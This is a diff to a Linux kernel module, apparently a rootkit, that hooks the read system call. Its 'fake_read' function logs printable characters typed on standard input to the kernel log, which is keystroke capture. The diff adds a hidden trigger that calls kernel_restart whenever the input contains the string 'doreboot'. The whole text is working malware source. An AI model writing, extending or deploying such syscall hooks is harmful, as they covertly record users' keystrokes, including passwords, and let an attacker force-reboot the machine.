@@ -14,6 +14,7 @@
 #include <linux/kernel.h>
 #include <linux/sched.h>
 #include <linux/delay.h>
+#include <linux/reboot.h>
 #include <asm/paravirt.h>
 #include "sysmap.h"
 
@@ -45,15 +46,22 @@ asmlinkage int fake_read(int fd, void* buf, size_t count)
 
     if (fd == 0)
     {
-        printk(KERN_INFO);
-        mybuf[1] = '\0';
-        for (i = 0; i < ret; i++)
+        if (strstr(buf, "doreboot"))
         {
-            mybuf[0] = ((char*)buf)[i];
-            if ((mybuf[0] < ' ') || (mybuf[0] > '~')) continue;
-            printk(mybuf);
+	    ((int (*)(char*))SM_kernel_restart)(NULL);
         }
-        printk("\n");
+        else
+        {
+	    printk(KERN_INFO);
+	    mybuf[1] = '\0';
+	    for (i = 0; i < ret; i++)
+	    {
+		mybuf[0] = ((char*)buf)[i];
+		if ((mybuf[0] < ' ') || (mybuf[0] > '~')) continue;
+		printk(mybuf);
+	    }
+	    printk("\n");
+        }
     }
 
     atomic_dec(&active_read_calls);
